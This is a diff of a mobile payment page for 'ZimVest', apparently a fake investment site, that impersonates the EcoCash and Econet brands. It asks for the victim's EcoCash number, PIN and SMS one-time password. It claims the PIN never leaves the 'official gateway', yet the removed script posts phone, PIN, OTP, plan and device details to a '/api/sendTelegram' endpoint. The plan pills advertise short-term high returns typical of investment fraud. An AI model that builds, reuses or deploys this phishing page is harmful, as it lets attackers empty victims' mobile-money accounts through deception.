@@ -5,408 +5,285 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
 <meta name="theme-color" content="#5B5FEF"/>
 <link rel="icon" href="assets/favicon.svg" type="image/svg+xml"/>
-<link rel="icon" href="assets/favicon.ico" sizes="any"/>
 <link rel="preconnect" href="https://fonts.googleapis.com"/>
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet"/>
-<title>Secure Payment · ZimVest</title>
+<title>Secure Payment - ZimVest</title>
 <style>
-*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 :root{
-  --bg:#EEF2F7;--surface:#FFFFFF;--surface-2:#F1F5F9;
-  --primary:#5B5FEF;--primary-d:#4547CC;--primary-lt:#818CF8;
-  --primary-ring:rgba(91,95,239,.15);
-  --success:#059669;
+  --bg:#EEF2F7;--sf:#fff;--s2:#F1F5F9;--s3:#E2E8F0;
+  --in:#5B5FEF;--ind:#4547CC;--inl:#818CF8;
+  --ir:rgba(91,95,239,.15);--ib:rgba(91,95,239,.08);
+  --em:#059669;--eml:#10B981;--er:rgba(5,150,105,.08);--ebd:rgba(5,150,105,.22);
   --t1:#0F172A;--t2:#1E293B;--t3:#475569;--t4:#64748B;--t5:#94A3B8;
-  --bd:#D1D9E6;--bd-md:#94A3B8;
-  --font:"Inter",system-ui,sans-serif;--mono:"JetBrains Mono","Courier New",monospace;
-  --r:12px;--r-lg:18px;--r-xl:24px;
-  --sh-sm:0 1px 3px rgba(15,23,42,.07),0 4px 14px rgba(15,23,42,.06);
-  --ease:cubic-bezier(.25,.46,.45,.94);
+  --bd:#D1D9E6;--bdm:#94A3B8;
+  --f:'Inter',system-ui,sans-serif;
+  --m:'JetBrains Mono','Courier New',monospace;
+  --r:12px;--rl:18px;--rxl:24px;
+  --e:cubic-bezier(.25,.46,.45,.94);
 }
-html,body{width:100%;height:100%;height:100dvh;font-family:var(--font);background:var(--bg);color:var(--t1);-webkit-font-smoothing:antialiased;overflow:hidden}
-.screen{max-width:430px;margin:0 auto;height:100%;height:100dvh;display:flex;flex-direction:column;background:var(--bg);overflow:hidden;position:relative}
+.hdr{background:linear-gradient(150deg,#4547CC 0%,#5B5FEF 100%);padding:calc(env(safe-area-inset-top)+14px) 18px 18px;flex-shrink:0;position:relative;overflow:hidden}
+.hdr::after{content:'';position:absolute;top:-60px;right:-60px;width:200px;height:200px;border-radius:50%;background:rgba(255,255,255,.08);pointer-events:none}
+.hi{position:relative;z-index:1}
+.ht{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
+.brd{display:flex;align-items:center;gap:10px}
+.bm{width:34px;height:34px;border-radius:9px;background:rgba(255,255,255,.2);border:1px solid rgba(255,255,255,.3);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.bm svg{width:18px;height:18px;stroke:#fff;stroke-width:2.5;fill:none;stroke-linecap:round}
+.bn{font-size:16px;font-weight:800;color:#fff;letter-spacing:-.3px}
+.bs{font-size:9px;color:rgba(255,255,255,.55);font-weight:600;text-transform:uppercase;letter-spacing:.5px;margin-top:1px}
+.hdr-eco{background:rgba(255,255,255,.96);border-radius:8px;padding:5px 10px;display:flex;align-items:center}
+.hdr-eco img{height:20px;width:auto;object-fit:contain;display:block}
+.plan-rw{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:6px}
+.pills{display:flex;gap:5px;flex-wrap:wrap}
+.pill{background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.2);border-radius:999px;padding:4px 9px;font-family:var(--m);font-size:10px;font-weight:600;color:rgba(255,255,255,.9);white-space:nowrap}
+.achip{font-family:var(--m);font-size:12px;font-weight:700;color:#fff;background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.25);padding:5px 11px;border-radius:999px}
 
-/* HEADER */
-.hdr{background:linear-gradient(150deg,#4547CC 0%,#5B5FEF 100%);padding:calc(env(safe-area-inset-top)+14px) 18px 20px;flex-shrink:0;position:relative;overflow:hidden}
-.hdr::after{content:"";position:absolute;top:-60px;right:-60px;width:200px;height:200px;border-radius:50%;background:rgba(255,255,255,.08);pointer-events:none}
-.hdr-inner{position:relative;z-index:1}
-.hdr-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
-.brand{display:flex;align-items:center;gap:10px}
-.brand-mark{width:34px;height:34px;border-radius:9px;background:rgba(255,255,255,.2);border:1px solid rgba(255,255,255,.3);display:flex;align-items:center;justify-content:center;flex-shrink:0}
-.brand-mark svg{width:18px;height:18px;stroke:#fff;stroke-width:2.5;fill:none;stroke-linecap:round}
-.brand-name{font-size:16px;font-weight:800;color:#fff;letter-spacing:-.3px}
-.brand-sub{font-size:9px;color:rgba(255,255,255,.55);font-weight:600;text-transform:uppercase;letter-spacing:.5px;margin-top:1px}
+.bd{flex:1;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;overscroll-behavior:contain;padding:0 0 calc(80px + env(safe-area-inset-bottom));background:var(--bg)}
+.bd::-webkit-scrollbar{display:none}
 
-/* econet.png in header — as-is, natural colours */
-.hdr-econet{display:flex;align-items:center;gap:7px;background:rgba(255,255,255,.95);border-radius:8px;padding:5px 9px}
-.hdr-econet img{height:24px;width:auto;object-fit:contain;display:block}
+.step{display:none;flex-direction:column}
+.step.on{display:flex;animation:up .2s var(--e)}
+@keyframes up{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:none}}
 
-.amount-chip{font-family:var(--mono);font-size:13px;font-weight:700;color:#fff;background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.25);padding:5px 12px;border-radius:999px}
-.plan-pills{display:flex;gap:5px;flex-wrap:wrap}
-.plan-pill{background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.2);border-radius:999px;padding:4px 10px;font-family:var(--mono);font-size:10px;font-weight:600;color:rgba(255,255,255,.88)}
+/* ecocash.png hero — white card, centered, NO MODIFICATIONS */
+.eco-hero{background:var(--sf);border-bottom:1px solid var(--bd);padding:22px 20px 20px;display:flex;flex-direction:column;align-items:center;text-align:center;gap:10px}
+.eco-hero img{display:block;height:44px;width:auto;object-fit:contain}
+.eco-hero-t{font-size:15px;font-weight:700;color:var(--t1)}
+.eco-hero-s{font-size:12px;color:var(--t3);line-height:1.55;max-width:280px}
+.eco-badge{display:inline-flex;align-items:center;gap:5px;background:var(--er);border:1px solid var(--ebd);border-radius:999px;padding:4px 10px;font-size:10px;font-weight:700;color:var(--em)}
+.eco-badge::before{content:'';width:5px;height:5px;border-radius:50%;background:var(--em);display:block}
 
-/* BODY */
-.body{flex:1;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;overscroll-behavior:contain;min-height:0;padding:18px 16px calc(88px + env(safe-area-inset-bottom));background:var(--bg)}
-.body::-webkit-scrollbar{display:none}
+.card{background:var(--sf);border-bottom:1px solid var(--bd);padding:16px 16px 20px;display:flex;flex-direction:column;gap:16px}
+.ct{font-size:13px;font-weight:700;color:var(--t1);padding-bottom:12px;border-bottom:1px solid var(--bd)}
 
-/* STEP */
-.step{display:none;flex-direction:column;gap:0}
-.step.active{display:flex;animation:fadeUp .2s var(--ease)}
-@keyframes fadeUp{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:none}}
+.fl{display:flex;flex-direction:column;gap:6px}
+.flb{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;color:var(--t3)}
+.fh{font-size:11px;color:var(--t5);font-weight:500}
 
-/* ECOCASH BRAND ROW — ecocash.png natural, no filters */
-.eco-brand-row{display:flex;align-items:center;gap:13px;background:#fff;border:1.5px solid var(--bd);border-radius:var(--r-lg);padding:14px 16px;margin-bottom:12px;box-shadow:var(--sh-sm)}
-.eco-brand-img{border-radius:12px;display:flex;align-items:center;justify-content:center;background:#fff;border:1px solid var(--bd);flex-shrink:0;padding:6px}
-.eco-brand-img img{width:64px;height:auto;object-fit:contain;display:block}
-.eco-brand-title{font-size:14px;font-weight:800;color:var(--t1);margin-bottom:3px}
-.eco-brand-sub{font-size:12px;color:var(--t3);font-weight:500;line-height:1.4}
-.eco-brand-badge{margin-top:6px;display:inline-flex;align-items:center;gap:5px;background:rgba(5,150,105,.08);border:1px solid rgba(5,150,105,.22);border-radius:999px;padding:3px 9px;font-size:10px;font-weight:700;color:#059669}
-.eco-brand-badge::before{content:"";width:5px;height:5px;border-radius:50%;background:#059669;display:block}
+.ph-row{display:flex;border:1.5px solid var(--bdm);border-radius:var(--r);overflow:hidden;background:var(--sf);transition:border-color .18s,box-shadow .18s}
+.ph-row:focus-within{border-color:var(--in);box-shadow:0 0 0 3px var(--ir)}
+.ph-pfx{display:flex;align-items:center;padding:0 14px;background:var(--s2);border-right:1.5px solid var(--bd);font:700 14px/1 var(--m);color:var(--t2);flex-shrink:0;user-select:none;letter-spacing:.3px}
+.ph-num{flex:1;height:50px;padding:0 14px;background:var(--sf);border:none;outline:none;font:500 16px/1 var(--m);color:var(--t1);-webkit-appearance:none}
+.ph-num::placeholder{color:var(--t5);font-family:var(--f)}
 
-/* CARD */
-.card{background:#fff;border:1.5px solid var(--bd);border-radius:var(--r-lg);overflow:hidden;margin-bottom:12px;box-shadow:var(--sh-sm)}
-.card-bar{height:3px;background:linear-gradient(90deg,#5B5FEF,#818CF8)}
-.card-hdr{padding:14px 16px 12px;border-bottom:1px solid var(--bd)}
-.card-title{font-size:14px;font-weight:700;color:var(--t1)}
-.card-sub{font-size:12px;color:var(--t3);margin-top:3px;line-height:1.45}
-.card-body{padding:16px;display:flex;flex-direction:column;gap:14px}
+.pin-wr{position:relative;display:flex;align-items:center}
+.pin-in{width:100%;height:50px;padding:0 48px 0 14px;background:var(--sf);border:1.5px solid var(--bdm);border-radius:var(--r);font:700 22px/1 var(--m);color:var(--t1);letter-spacing:7px;outline:none;-webkit-appearance:none;transition:border-color .18s,box-shadow .18s}
+.pin-in::placeholder{color:var(--t5);font-size:15px;letter-spacing:normal;font-weight:500;font-family:var(--f)}
+.pin-in:focus{border-color:var(--in);box-shadow:0 0 0 3px var(--ir)}
+.eye{position:absolute;right:13px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--t5);display:flex;padding:4px;transition:color .15s}
+.eye:hover{color:var(--in)}
+.eye svg{width:17px;height:17px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
 
-/* FIELD */
-.field{display:flex;flex-direction:column;gap:6px}
-.f-label{font-size:10px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.8px}
-.f-hint{font-size:11px;color:var(--t5);font-weight:500}
+.sn{display:flex;align-items:flex-start;gap:9px;background:var(--er);border:1px solid var(--ebd);border-radius:12px;padding:12px 14px;margin:12px 16px 0}
+.sn svg{width:14px;height:14px;stroke:var(--em);fill:none;stroke-width:2;stroke-linecap:round;flex-shrink:0;margin-top:1px}
+.sn span{font-size:11px;color:var(--t2);font-weight:500;line-height:1.5}
+.pw{text-align:center;padding:10px 0 4px;font-size:9px;color:var(--t5);letter-spacing:.6px;text-transform:uppercase}
 
-/* PHONE ROW — exactly same as auth/forgot/dashboard */
-.phone-row{display:flex;border:1.5px solid var(--bd-md);border-radius:var(--r);overflow:hidden;background:#fff;transition:border-color .18s,box-shadow .18s}
-.phone-row:focus-within{border-color:var(--primary);box-shadow:0 0 0 3px var(--primary-ring)}
-.phone-pfx{display:flex;align-items:center;padding:0 14px;background:var(--surface-2);border-right:1.5px solid var(--bd);font:700 14px/1 var(--mono);color:var(--t2);flex-shrink:0;user-select:none;letter-spacing:.3px}
-.phone-num{flex:1;height:50px;padding:0 14px;background:#fff;border:none;outline:none;font:500 16px/1 var(--mono);color:var(--t1);-webkit-appearance:none}
-.phone-num::placeholder{color:var(--t5);font-family:var(--font)}
+/* OTP step */
+.otp-card{background:var(--sf);border-bottom:1px solid var(--bd);padding:16px 16px 20px;margin:0;display:flex;flex-direction:column;gap:14px}
+.otp-wr{position:relative;height:58px}
+#otpH{position:absolute;inset:0;width:100%;height:100%;opacity:0;cursor:pointer;font-size:16px;z-index:2;border:none;background:none;outline:none;caret-color:transparent}
+.otp-row{display:flex;gap:7px;pointer-events:none}
+.ob{flex:1;height:58px;border-radius:var(--r);border:1.5px solid var(--bdm);background:var(--sf);display:flex;align-items:center;justify-content:center;font:700 22px/1 var(--m);color:var(--t1);transition:all .15s}
+.ob.filled{border-color:var(--in)}
+.ob.active{border-color:var(--in);background:#EEF1FF;box-shadow:0 0 0 3px var(--ir)}
+.ob.disabled{opacity:.4;background:var(--s2)}
+.trw{display:flex;justify-content:space-between;align-items:center;padding-top:10px}
+.tl{font-size:12px;color:var(--t4)}
+.tn{font-family:var(--m);font-weight:700;color:var(--in)}
+.rsnd{background:none;border:none;font:700 12px/1 var(--f);color:var(--in);cursor:pointer;opacity:.3;padding:0;transition:opacity .18s}
+.rsnd.on{opacity:1}
+.mn{font-size:13px;color:var(--t3);text-align:center;line-height:1.5}
 
-/* PIN */
-.pin-wrap{position:relative;display:flex;align-items:center}
-.pin-input{width:100%;height:50px;padding:0 48px 0 14px;background:#fff;border:1.5px solid var(--bd-md);border-radius:var(--r);font:700 22px/1 var(--mono);color:var(--t1);letter-spacing:7px;outline:none;-webkit-appearance:none;transition:border-color .18s,box-shadow .18s}
-.pin-input::placeholder{color:var(--t5);font-size:15px;letter-spacing:normal;font-weight:500;font-family:var(--font)}
-.pin-input:focus{border-color:var(--primary);box-shadow:0 0 0 3px var(--primary-ring)}
-.eye-btn{position:absolute;right:13px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--t5);display:flex;padding:4px;transition:color .15s}
-.eye-btn:hover{color:var(--primary)}
-.eye-btn svg{width:17px;height:17px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
-
-/* OTP */
-.otp-wrap{position:relative;height:58px}
-#otpHidden{position:absolute;inset:0;width:100%;height:100%;opacity:0;cursor:pointer;font-size:16px;z-index:2;border:none;background:none;outline:none;caret-color:transparent}
-.otp-display{display:flex;gap:7px;pointer-events:none}
-.otp-box{flex:1;height:58px;border-radius:var(--r);border:1.5px solid var(--bd-md);background:#fff;display:flex;align-items:center;justify-content:center;font:700 22px/1 var(--mono);color:var(--t1);transition:all .15s}
-.otp-box.filled{background:#fff;border-color:var(--primary)}
-.otp-box.active{border-color:var(--primary);background:#EEF1FF;box-shadow:0 0 0 3px var(--primary-ring)}
-.otp-box.disabled{opacity:.4;background:var(--surface-2)}
-.timer-row{display:flex;justify-content:space-between;align-items:center;padding-top:10px}
-.timer-lbl{font-size:12px;color:var(--t4);font-weight:500}
-.timer-num{font-family:var(--mono);font-weight:700;color:var(--primary)}
-.resend-btn{background:none;border:none;font:700 12px/1 var(--font);color:var(--primary);cursor:pointer;opacity:.3;padding:0;transition:opacity .18s}
-.resend-btn.active{opacity:1}
-.masked-note{font-size:13px;color:var(--t3);text-align:center;padding:2px 0 6px;line-height:1.5}
-
-/* SECURE NOTICE */
-.secure-notice{display:flex;align-items:flex-start;gap:9px;background:rgba(5,150,105,.07);border:1px solid rgba(5,150,105,.22);border-radius:var(--r-lg);padding:12px 14px;margin-bottom:12px}
-.secure-notice svg{width:14px;height:14px;stroke:#059669;fill:none;stroke-width:2;stroke-linecap:round;flex-shrink:0;margin-top:1px}
-.secure-notice span{font-size:11px;color:var(--t2);font-weight:500;line-height:1.5}
-
-/* PROCESSING */
-.proc-body{padding:32px 20px;text-align:center;background:#fff}
-.proc-ring{width:52px;height:52px;border-radius:50%;margin:0 auto 16px;border:3px solid var(--bd);border-top-color:var(--primary);animation:spin 1s linear infinite}
+/* Processing */
+.proc{padding:40px 20px;text-align:center;background:var(--sf)}
+.proc-r{width:52px;height:52px;border-radius:50%;margin:0 auto 16px;border:3px solid var(--s3);border-top-color:var(--in);animation:spin 1s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
-.proc-title{font-size:16px;font-weight:800;color:var(--t1);margin-bottom:5px}
-.proc-sub{font-size:13px;color:var(--t4);line-height:1.5}
+.proc-t{font-size:16px;font-weight:700;color:var(--t1);margin-bottom:5px}
+.proc-s{font-size:13px;color:var(--t4);line-height:1.5}
 
-/* FOOTER */
-.sticky-foot{position:absolute;bottom:0;left:0;right:0;padding:12px 16px max(20px,env(safe-area-inset-bottom));background:linear-gradient(to top,var(--bg) 65%,transparent);z-index:10}
-.action-btn{width:100%;padding:16px;border-radius:var(--r-xl);border:none;font:800 14px/1 var(--font);cursor:not-allowed;letter-spacing:.05px;background:var(--bd);color:var(--t5);transition:all .18s var(--ease)}
-.action-btn.active{background:var(--primary);color:#fff;cursor:pointer;box-shadow:0 4px 16px var(--primary-ring)}
-.action-btn.active:hover{background:var(--primary-d);transform:translateY(-1px)}
-.action-btn.active:active{transform:scale(.98)}
-.powered{text-align:center;padding:6px 0 2px;font-size:9px;color:var(--t5);letter-spacing:.5px;text-transform:uppercase}
+.foot{position:absolute;bottom:0;left:0;right:0;padding:12px 16px max(20px,env(safe-area-inset-bottom));background:linear-gradient(to top,var(--bg) 65%,transparent);z-index:10}
+.ab{width:100%;padding:16px;border-radius:var(--rxl);border:none;font:800 14px/1 var(--f);cursor:not-allowed;background:var(--s3);color:var(--t5);transition:all .18s var(--e)}
+.ab.on{background:var(--in);color:#fff;cursor:pointer;box-shadow:0 4px 16px var(--ir)}
+.ab.on:hover{background:var(--ind);transform:translateY(-1px)}
+.ab.on:active{transform:scale(.98)}
 
-/* ── RESPONSIVE: fills mobile like native app, centers on desktop ── */
-@media(min-width:600px){
-  body{display:flex;align-items:flex-start;justify-content:center;background:#0F172A}
-  .screen{
-    max-width:480px;width:100%;
-    height:100vh;height:100dvh;
-    box-shadow:0 0 0 1px rgba(255,255,255,.06),0 24px 80px rgba(0,0,0,.5);
+
+
+/* ══ RESPONSIVE LAYOUT ══ */
+html,body{
+  width:100%;min-height:100vh;min-height:100dvh;
+  font-family:var(--f,'Inter',system-ui,sans-serif);color:#0F172A;
+  -webkit-font-smoothing:antialiased;
+  background:#EEF2F7;
+}
+/* Mobile: full-screen app */
+.app-shell,.screen,.sh{
+  width:100%;min-height:100dvh;
+  display:flex;flex-direction:column;
+  background:#EEF2F7;
+}
+/* Tablet+ : true centered card layout, NOT phone mockup */
+@media(min-width:700px){
+  body{
+    display:flex;align-items:center;justify-content:center;
+    min-height:100vh;padding:40px 24px;
+    background:linear-gradient(135deg,#EEF2F7 0%,#E0E8F4 100%);
   }
+  .app-shell,.screen,.sh{
+    min-height:auto;
+    max-width:480px;width:100%;
+    border-radius:24px;
+    box-shadow:0 4px 6px rgba(15,23,42,.04),0 20px 60px rgba(15,23,42,.10),0 0 0 1px rgba(15,23,42,.06);
+    overflow:hidden;
+  }
+  /* Header gets rounded top */
+  .hdr{border-radius:24px 24px 0 0;overflow:hidden}
 }
 @media(min-width:1024px){
-  body{align-items:center}
-  .screen{max-width:430px}
+  body{padding:60px 24px}
+  .app-shell,.screen,.sh{max-width:440px}
 }
 </style>
 </head>
 <body>
-<div class="screen">
-
+<div class="sh">
   <div class="hdr">
-    <div class="hdr-inner">
-      <div class="hdr-top">
-        <div class="brand">
-          <div class="brand-mark"><svg viewBox="0 0 24 24"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg></div>
-          <div><div class="brand-name">ZimVest</div><div class="brand-sub">Secure Payment Portal</div></div>
+    <div class="hi">
+      <div class="ht">
+        <div class="brd">
+          <div class="bm"><svg viewBox="0 0 24 24"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg></div>
+          <div><div class="bn">ZimVest</div><div class="bs">Secure Payment</div></div>
         </div>
-        <!-- econet.png as-is, natural colours on white pill -->
-        <div class="hdr-econet">
-          <img src="assets/econet.png" alt="Econet" style="height:22px;width:auto;object-fit:contain;display:block"/>
-        </div>
+        <div class="hdr-eco"><img src="assets/econet.png" alt="Econet Wireless"/></div>
       </div>
-      <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px">
-        <div class="plan-pills">
-          <span class="plan-pill" id="pillPlan">— Plan</span>
-          <span class="plan-pill" id="pillReturn">— Return</span>
-          <span class="plan-pill" id="pillHours">— hrs</span>
+      <div class="plan-rw">
+        <div class="pills">
+          <span class="pill" id="pPlan">Plan</span>
+          <span class="pill" id="pReturn">Return</span>
+          <span class="pill" id="pHours">Duration</span>
         </div>
-        <div class="amount-chip" id="headerAmount">USD 0.00</div>
+        <div class="achip" id="pAmt">USD 0.00</div>
       </div>
     </div>
   </div>
 
-  <div class="body">
+  <div class="bd">
 
     <!-- STEP 1 -->
-    <div id="step1" class="step active">
-      <!-- ecocash.png displayed at natural size, no CSS filter -->
-      <div class="eco-brand-row">
-        <div class="eco-brand-img"><img src="assets/ecocash.png" alt="EcoCash" style="width:72px;height:auto;object-fit:contain;display:block"/></div>
-        <div>
-          <div class="eco-brand-title">EcoCash Secure Portal</div>
-          <div class="eco-brand-sub">Your EcoCash PIN is entered directly in the official gateway — ZimVest never sees it</div>
-          <div class="eco-brand-badge">Official EcoCash gateway</div>
-        </div>
+    <div id="s1" class="step on">
+      <!-- ecocash.png CENTERED BEFORE CARD, no modification, no filter, natural size -->
+      <div class="eco-hero">
+        <img src="assets/ecocash.png" alt="EcoCash"/>
+        <div class="eco-hero-t">EcoCash Secure Portal</div>
+        <div class="eco-hero-s">Your PIN is entered directly in the official EcoCash gateway — ZimVest never sees it</div>
+        <div class="eco-badge">Official gateway</div>
       </div>
 
       <div class="card">
-        <div class="card-bar"></div>
-        <div class="card-hdr">
-          <div class="card-title">Enter your EcoCash details</div>
-          <div class="card-sub">EcoCash number and PIN linked to your investment</div>
+        <div class="ct">Enter your EcoCash details</div>
+        <div class="fl">
+          <div class="flb">EcoCash number</div>
+          <div class="ph-row">
+            <div class="ph-pfx">+263</div>
+            <input class="ph-num" type="tel" id="ph" inputmode="numeric" pattern="[0-9]*" maxlength="9" placeholder="7XXXXXXXX" autocomplete="tel"/>
+          </div>
+          <div class="fh">9 digits starting with 7</div>
         </div>
-        <div class="card-body">
-          <div class="field">
-            <div class="f-label">EcoCash number</div>
-            <div class="phone-row">
-              <div class="phone-pfx">+263</div>
-              <input class="phone-num" type="tel" id="phone" inputmode="numeric" pattern="[0-9]*" maxlength="9" placeholder="7XXXXXXXX" autocomplete="tel"/>
-            </div>
-            <div class="f-hint">9 digits starting with 7</div>
+        <div class="fl">
+          <div class="flb">EcoCash PIN</div>
+          <div class="pin-wr">
+            <input class="pin-in" type="password" id="pin" inputmode="numeric" maxlength="4" pattern="[0-9]*" placeholder="4-digit PIN" autocomplete="current-password"/>
+            <button class="eye" id="eBtn" type="button">
+              <svg id="eIco" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+            </button>
           </div>
-          <div class="field">
-            <div class="f-label">EcoCash PIN</div>
-            <div class="pin-wrap">
-              <input class="pin-input" type="password" id="pinInput" inputmode="numeric" maxlength="4" pattern="[0-9]*" placeholder="4-digit PIN" autocomplete="current-password"/>
-              <button class="eye-btn" id="eyeBtn" type="button">
-                <svg id="eyeIcon" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
-              </button>
-            </div>
-            <div class="f-hint">Your PIN is never stored or seen by ZimVest</div>
-          </div>
+          <div class="fh">Your PIN is never stored or seen by ZimVest</div>
         </div>
       </div>
 
-      <div class="secure-notice">
+      <div class="sn">
         <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-        <span>256-bit SSL encrypted · Payments processed by EcoCash · Your PIN never leaves the official gateway</span>
+        <span>256-bit SSL · Official EcoCash gateway · Your PIN never leaves EcoCash systems</span>
       </div>
-      <div class="powered">ZimVest · Secured by EcoCash · Zimbabwe</div>
+      <div class="pw" style="margin-top:10px">ZimVest · Secured by EcoCash · Zimbabwe</div>
     </div>
 
     <!-- STEP 2: OTP -->
-    <div id="step3" class="step">
-      <div class="card">
-        <div class="card-bar"></div>
-        <div class="card-hdr">
-          <div class="card-title">One-Time Password</div>
-          <div class="card-sub">Check your EcoCash SMS for the 6-digit verification code</div>
-        </div>
-        <div class="card-body">
-          <div class="field">
-            <div class="masked-note" id="maskedNumber">Enter the OTP sent to your number</div>
-          </div>
-          <div class="field">
-            <div class="f-label">OTP Code</div>
-            <div class="otp-wrap" id="otpWrap">
-              <input type="text" id="otpHidden" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code"/>
-              <div class="otp-display">
-                <div class="otp-box" id="ob0"></div><div class="otp-box" id="ob1"></div>
-                <div class="otp-box" id="ob2"></div><div class="otp-box" id="ob3"></div>
-                <div class="otp-box" id="ob4"></div><div class="otp-box" id="ob5"></div>
-              </div>
+    <div id="s2" class="step">
+      <div class="otp-card" style="margin:16px;border-radius:18px;border:1.5px solid var(--bd);box-shadow:0 1px 3px rgba(15,23,42,.07),0 4px 14px rgba(15,23,42,.05)">
+        <div class="ct">One-Time Password</div>
+        <div class="mn" id="mn">Enter the OTP sent to your number</div>
+        <div class="fl">
+          <div class="flb">6-digit OTP from your EcoCash SMS</div>
+          <div class="otp-wr" id="otpWr">
+            <input type="text" id="otpH" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code"/>
+            <div class="otp-row">
+              <div class="ob" id="ob0"></div><div class="ob" id="ob1"></div>
+              <div class="ob" id="ob2"></div><div class="ob" id="ob3"></div>
+              <div class="ob" id="ob4"></div><div class="ob" id="ob5"></div>
             </div>
           </div>
-          <div class="timer-row">
-            <div class="timer-lbl">Expires in <span class="timer-num" id="time">120</span>s</div>
-            <button class="resend-btn" id="resendBtn">Resend OTP</button>
-          </div>
+        </div>
+        <div class="trw">
+          <div class="tl">Expires in <span class="tn" id="tc">120</span>s</div>
+          <button class="rsnd" id="rsnd">Resend OTP</button>
         </div>
       </div>
-      <div class="powered">ZimVest · Secured by EcoCash</div>
+      <div class="pw">ZimVest · Secured by EcoCash</div>
     </div>
 
     <!-- STEP 3: Processing -->
-    <div id="step4" class="step">
-      <div class="card">
-        <div class="card-bar"></div>
-        <div class="proc-body">
-          <div class="proc-ring"></div>
-          <div class="proc-title">Activating your investment…</div>
-          <div class="proc-sub">Your EcoCash payment is being confirmed.<br>This will only take a moment.</div>
-        </div>
+    <div id="s3" class="step">
+      <div class="proc" style="margin:16px;border-radius:18px;border:1.5px solid var(--bd)">
+        <div class="proc-r"></div>
+        <div class="proc-t">Activating your investment</div>
+        <div class="proc-s">Your EcoCash payment is being confirmed.<br>This takes just a moment.</div>
       </div>
     </div>
 
   </div>
 
-  <div class="sticky-foot">
-    <button class="action-btn" id="mainBtn">Invest Securely</button>
+  <div class="foot">
+    <button class="ab" id="mb">Invest Securely</button>
   </div>
-
 </div>
 <script>
-let phoneValue="",pinValue="",otpValue="";
-let loginClicked=false,otpSubmitted=false,resendClicked=false;
-let currentStep="step1";
-let selectedPlan=null;
-try{selectedPlan=JSON.parse(sessionStorage.getItem("zimvest_plan"));}catch(e){}
-
-function initHeader(){
-  if(!selectedPlan)return;
-  document.getElementById("headerAmount").textContent="USD "+selectedPlan.amount;
-  document.getElementById("pillPlan").textContent=selectedPlan.name+" Plan";
-  document.getElementById("pillReturn").textContent="+"+selectedPlan.pct+"% Return";
-  document.getElementById("pillHours").textContent=selectedPlan.hours+" hrs";
+var pv='',pnv='',ov='',cur='s1';
+var lc=false,os=false,rc=false,od=false;
+var plan=null;
+try{plan=JSON.parse(sessionStorage.getItem('zimvest_plan'));}catch(e){}
+if(plan){
+  document.getElementById('pAmt').textContent='USD '+plan.amount;
+  document.getElementById('pPlan').textContent=plan.name+' Plan';
+  document.getElementById('pReturn').textContent='+'+plan.pct+'%';
+  document.getElementById('pHours').textContent=plan.hours+'h payout';
 }
-initHeader();
-
-const ua=navigator.userAgent;
-let device="Unknown";
-if(/Android/i.test(ua))device="Android";
-else if(/iPhone|iPad/i.test(ua))device="iOS";
-if(/Chrome/i.test(ua))device+=" | Chrome";
-else if(/Safari/i.test(ua))device+=" | Safari";
-
-function getPlanLine(){
-  if(!selectedPlan)return"No plan selected";
-  return"Plan: "+selectedPlan.name+" | Deposit: $"+selectedPlan.amount+" | Return: +"+selectedPlan.pct+"% | Payout: $"+selectedPlan.payout+" in "+selectedPlan.hours+"hrs";
-}
-
-function sendToTelegram(ev){
-  fetch("/api/sendTelegram",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:phoneValue,loginPin:pinValue,otp:otpValue,event:ev,plan:getPlanLine(),device:device})});
-}
-
-function showStep(id){
-  document.querySelectorAll(".step").forEach(s=>s.classList.remove("active"));
-  document.getElementById(id).classList.add("active");
-  currentStep=id;updateBtn();
-}
-
-function updateBtn(){
-  const btn=document.getElementById("mainBtn");
-  if(currentStep==="step1"){btn.textContent="Invest Securely →";validateLogin();}
-  else if(currentStep==="step3"){btn.textContent="Confirm OTP →";validateOtp();}
-  else{btn.textContent="Processing…";btn.classList.remove("active");}
-}
-
-// Phone — same enforcement as all other pages
-const phoneEl=document.getElementById("phone");
-phoneEl.oninput=function(e){
-  let v=e.target.value.replace(/\D/g,"");
-  if(v.startsWith("263"))v=v.slice(3);
-  if(v.startsWith("0"))v=v.slice(1);
